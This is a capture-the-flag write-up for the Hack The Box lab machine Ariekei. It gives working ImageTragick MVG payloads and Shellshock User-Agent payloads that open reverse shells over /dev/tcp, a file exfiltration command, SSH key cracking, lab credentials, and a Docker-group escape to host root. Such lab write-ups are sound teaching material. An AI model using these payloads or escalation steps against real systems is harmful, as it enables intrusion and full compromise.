---
icon: cloud
cover: ../../../../.gitbook/assets/Screenshot 2026-02-22 232745.png
coverY: -8.333698382724391
---

# HTB-ARIEKEI

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ rustscan -a 10.10.10.65 blah blah
```

```
Open 10.10.10.65:22
Open 10.10.10.65:443
Open 10.10.10.65:1022

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
443/tcp  open  ssl/https nginx/1.10.2
1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
```

**Why this matters:** Two different OpenSSH versions mean two different OS versions — port 22 is Ubuntu 16.04 Xenial, port 1022 is Ubuntu 14.04 Trusty. This strongly implies Docker containers. Port 1022 is likely the entry to a bastion container.

***

### Virtual Host Enumeration

#### TLS Certificate Analysis

Inspecting the TLS certificate on port 443 reveals the organization name `Ariekei` and two Subject Alternative Names:

```
calvin.ariekei.htb
beehive.ariekei.htb
```

Adding all three to `/etc/hosts`:

```
10.10.10.65 ariekei.htb beehive.ariekei.htb calvin.ariekei.htb
```

#### VHost Fuzz

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ wfuzz -u https://10.10.10.65 -H "Host: FUZZ.ariekei.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 487
```

```
000002730:  404  "calvin"
```

`beehive` is filtered because it returns the same byte count as the default case — it exists but gets missed by size-based filtering.

**Why this matters:** Both subdomains serve different applications behind the same WAF, and each has a different attack surface.

***

### beehive.ariekei.htb

#### Directory Enumeration

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ feroxbuster -u https://beehive.ariekei.htb -k
```

```
301  https://beehive.ariekei.htb/blog
403  https://beehive.ariekei.htb/server-status
```

The 403 on `/server-status` is an Apache endpoint — NGINX is reverse-proxying to Apache, likely in a separate container.

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ feroxbuster -u https://beehive.ariekei.htb -k -f -d 1
```

```
403  https://beehive.ariekei.htb/cgi-bin/
200  https://beehive.ariekei.htb/blog/
```

Enumerating inside `/cgi-bin`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ feroxbuster -u https://beehive.ariekei.htb/cgi-bin -k
```

```
200  https://beehive.ariekei.htb/cgi-bin/stats
```

#### /cgi-bin/stats

The page returns a live dump of `date`, `uptime`, and `bash --version`:

```
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
```

**Why this matters:** Bash 4.2.37 is well within the Shellshock-vulnerable range (pre-4.3 patch). Combined with a CGI endpoint, this is a textbook Shellshock setup.

The response header also confirms:

```
X-Ariekei-WAF: beehive.ariekei.htb
```

A WAF is sitting in front of this.

***

### calvin.ariekei.htb

#### Directory Enumeration

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ feroxbuster -u https://calvin.ariekei.htb/ -k
```

```
200  https://calvin.ariekei.htb/upload
```

#### /upload — Image Converter

The page accepts image uploads and converts them using ImageMagick. The HTML source contains a hint referencing `.mvg` files — ImageMagick's vector graphics format.

**Why this matters:** An image converter running ImageMagick from 2016 is almost certainly vulnerable to ImageTragick (CVE-2016-3714) — command injection via malicious `.mvg` files.

***

### WAF Enumeration — Shellshock Blocked

Attempting a standard Shellshock User-Agent against the external HTTPS endpoint:

```
User-Agent: () { :;}; echo; /usr/bin/id
```

Returns `403 Forbidden` with a taunting ASCII face in the response body.

Progressively stripping the payload reveals the exact WAF trigger: the four-character sequence `() {` is blocked. URL-encoding does not bypass it.

**Why this matters:** We know Shellshock works on the backend but is blocked externally — we need a path that bypasses the WAF, which becomes possible once we have a foothold on the internal network.

***

### Shell as root on calvin (ImageTragick — CVE-2016-3714)

#### Proof of Execution (Ping)

Create `ping.mvg`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://1.1.1.1/x.jpg"|ping -c 1 10.10.14.78;echo "done)'
pop graphic-context
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ sudo tcpdump -ni tun0 icmp
```

Upload the file through `/upload`. ICMP arrives:

```
IP 10.10.10.65 > 10.10.14.78: ICMP echo request, id 15, seq 1, length 64
```

**Why this matters:** The injection closes the URL string early with a `"`, injects an arbitrary shell command, then reopens the string to avoid parse errors — a classic format string injection turned into RCE.

#### Reverse Shell

Create `shell.mvg`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://1.1.1.1/x.jpg"|bash -i >& /dev/tcp/10.10.14.78/443 0>&1;echo "done)'
pop graphic-context
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ nc -lnvp 443
Connection received on 10.10.10.65 45906

[root@calvin app]#
```

We land as `root` inside the `calvin` container.

#### Shell Upgrade

```
[root@calvin app]# script /dev/null -c bash
^Z
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ stty raw -echo; fg
reset
Terminal type? screen
[root@calvin app]#
```

***

### Container Enumeration

#### Confirming Docker

```
[root@calvin /]# ls -a /
.dockerenv  app  bin  common  dev  etc  ...
```

The presence of `.dockerenv` and the hostname `calvin` confirm we're inside a container.

#### /common — Shared Host Mount

```
[root@calvin /]# mount | grep common
/dev/mapper/ariekei--vg-root on /common type ext4 (ro,relatime,...)
```

This is the host filesystem mounted read-only. It contains three directories:

```
[root@calvin common]# ls -a
.secrets  containers  network
```

#### Network Layout

`network/make_nets.sh` reveals two Docker subnets:

```bash
# Isolated build network — no internet
docker network create --subnet=172.24.0.0/24 arieka-test-net

# Live network — internet access
docker network create --subnet=172.23.0.0/24 arieka-live-net
```

An image file (`info.png`) in this directory visualizes the full topology. Exfiltrating it:

```
[root@calvin network]# cat info.png > /dev/tcp/10.10.14.78/443
```

The image shows four containers: `bastion-live` (on both networks, SSH forwarded to host:1022), `waf-live` (also on both), `convert-live` (calvin, on live net only), and `blog-test` (beehive, on test net — no internet).

**Why this matters:** `beehive` has no internet access, which is why reverse shells to our machine fail. We need to route through `bastion`.

#### Container Dockerfiles — Hardcoded Credentials

```
[root@calvin common]# cat containers/blog-test/Dockerfile

FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
```

The same root password appears in `bastion-live/Dockerfile`.

**Why this matters:** Developers hardcoding credentials in Dockerfiles — which get committed to version control or left on shared mounts — is a critical misconfiguration.

#### SSH Key in .secrets

```
[root@calvin common]# ls .secrets/
bastion_key  bastion_key.pub
```

The public key is signed by `root@arieka`. This is the SSH key for the bastion host.

***

### Shell as root on bastion

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ chmod 600 bastion_key
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ ssh root@10.10.10.65 -p 1022 -i bastion_key

root@ezra:~#
```

We're now on the bastion container, which sits on both the `172.23.0.0/24` (live) and `172.24.0.0/24` (test) networks — our pivot point to reach `beehive` directly.

***

### Shell as www-data on beehive (Shellshock  CVE-2014-6271)

#### Bypassing the WAF

From bastion, we can talk directly to beehive on `172.24.0.2:80` — no WAF in the path:

```
root@ezra:~# wget -O- http://172.24.0.2/cgi-bin/stats
[returns stats page]
```

Now trying the Shellshock payload directly:

```
root@ezra:~# wget -U '() { :;}; echo; /usr/bin/id' -O- http://172.24.0.2/cgi-bin/stats

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why this matters:** The WAF only protects the HTTPS-facing edge. Internal container-to-container traffic bypasses it entirely — lateral movement invalidates perimeter security.

#### Tunneled Reverse Shell

`beehive` has no internet access, so a direct callback to our machine fails. We set up an SSH remote port forward from bastion:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ ssh root@10.10.10.65 -p 1022 -i bastion_key -R 4443:10.10.14.78:443
```

This makes bastion listen on `172.24.0.253:4443` and forward anything it receives through the SSH tunnel to our machine on port 443.

Shellshock payload redirecting to bastion's internal IP:

```
root@ezra:~# wget -U '() { :;}; echo; /bin/bash >& /dev/tcp/172.24.0.253/4443 0>&1' \
  -O- http://172.24.0.2/cgi-bin/stats
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ nc -lnvp 443
Connection received on 10.10.10.65 39420

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell upgrade:

```
script /dev/null -c bash
^Z
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ stty raw -echo; fg
reset
Terminal type? screen
www-data@beehive:/usr/lib/cgi-bin$
```

#### Escalate to root on beehive

The password found in the Dockerfile works:

```
www-data@beehive:/usr/lib/cgi-bin$ su -
Password: Ib3!kTEvYw6*P7s

root@beehive:~#
```

This only works after upgrading to a full PTY.

***

### Shell as spanishdancer on Host

#### SSH Key Discovery

```
root@beehive:/home/spanishdancer/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
```

The `authorized_keys` file matches `id_rsa.pub` — this user's own private key is their authorized key, and the key comment is `spanishdancer@ariekei.htb`.

#### Cracking the Encrypted Private Key

The private key is AES-128-CBC encrypted.

Convert to hashcat format:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ ssh2john spanishdancer.key > spanishdancer.hash
```

Crack:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ hashcat -m 22931 spanishdancer.hash /usr/share/wordlists/rockyou.txt --user

$sshng$ <SNIP> purple1
```

**Why this matters:** Weak passphrases on SSH private keys stored in world-accessible (to root) locations negate the security benefit of key-based auth entirely.

#### Decrypt and Connect

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ openssl rsa -in spanishdancer.key -out spanishdancer_clean
Enter pass phrase: purple1

┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ chmod 600 spanishdancer_clean
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ ssh -i spanishdancer_clean spanishdancer@10.10.10.65

spanishdancer@ariekei:~$
```

***

### Shell as root on Ariekei (Docker Group Escape)

#### Docker Group Membership

```
spanishdancer@ariekei:~$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
```

**Why this matters:** Membership in the `docker` group is functionally equivalent to root access — any user in this group can mount the host filesystem into a container with full read/write as root.

#### Listing Containers and Images

```
spanishdancer@ariekei:~$ docker ps
CONTAINER ID  IMAGE             COMMAND              NAMES
c362989563fd  convert-template  "python..."          convert-live
7786500c3e80  bastion-template  "/usr/sbin/sshd -D"  bastion-live
e980d631b20e  waf-template      "nginx..."           waf-live
d77fe9521405  web-template      "apache2..."         blog-test

spanishdancer@ariekei:~$ docker images
REPOSITORY         TAG     IMAGE ID
waf-template       latest  399c8876e9ae
bastion-template   latest  0df894ef4624
web-template       latest  b2a8f8d3ef38
bash               latest  a66dc6cea720
convert-template   latest  e74161aded79
```

#### Method 1  sudoers Modification

Mount the entire host root filesystem into the `bash` image:

```
spanishdancer@ariekei:~$ docker run -v /:/mnt -it bash bash

bash-4.4# ls /mnt/root/
root.txt

bash-4.4# cat /mnt/root/root.txt
4b2d10a8************************
```

The `sudoers` file is read-only but we can chmod it from within the container:

```
bash-4.4# chmod 640 /mnt/etc/sudoers
bash-4.4# vi /mnt/etc/sudoers
```

Add the line:

```
spanishdancer   ALL=(ALL) NOPASSWD: ALL
```

Restore permissions:

```
bash-4.4# chmod 440 /mnt/etc/sudoers
bash-4.4# exit
```

```
spanishdancer@ariekei:~$ sudo su -
root@ariekei:~#
```

#### Method 2 — SSH Key Injection

From inside the container, create the `.ssh` directory in root's home and drop in our public key:

```
bash-4.4# mkdir /mnt/root/.ssh
bash-4.4# echo "ssh-ed25519 AAAA...our_pubkey... sn0x" > /mnt/root/.ssh/authorized_keys
bash-4.4# exit
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Ariekei]
└─$ ssh -i ~/.ssh/id_ed25519 root@10.10.10.65

root@ariekei:~#
```

**Why this matters:** Both methods exploit the same root cause — a user in the `docker` group can always escape to the host as root. The Docker socket is effectively an unrestricted sudo.

***

### Attack Flow

```
TLS cert → VHost discovery (beehive, calvin)
    |
    +--[calvin]--> /upload → ImageTragick (CVE-2016-3714)
    |                  --> RCE as root@calvin container
    |                      --> /common (host mount, read-only)
    |                          --> .secrets/bastion_key
    |                          --> containers/*/Dockerfile (hardcoded creds)
    |                          --> network topology image
    |
    +--[bastion]--> SSH via bastion_key on port 1022
    |                  --> Pivot host on both subnets
    |
    +--[beehive]--> Shellshock on /cgi-bin/stats (CVE-2014-6271)
                       --> WAF bypassed via direct internal access
                       --> Reverse shell tunneled through SSH -R
                       --> www-data → root via Dockerfile password
                       --> /home/spanishdancer (host mount)
                           --> Encrypted SSH private key
                               --> Cracked (purple1)
                                   --> spanishdancer@ariekei (host)
                                       --> docker group membership
                                           --> docker run -v /:/mnt
                                               --> sudoers edit / SSH key injection
                                                   --> root@ariekei
```

***
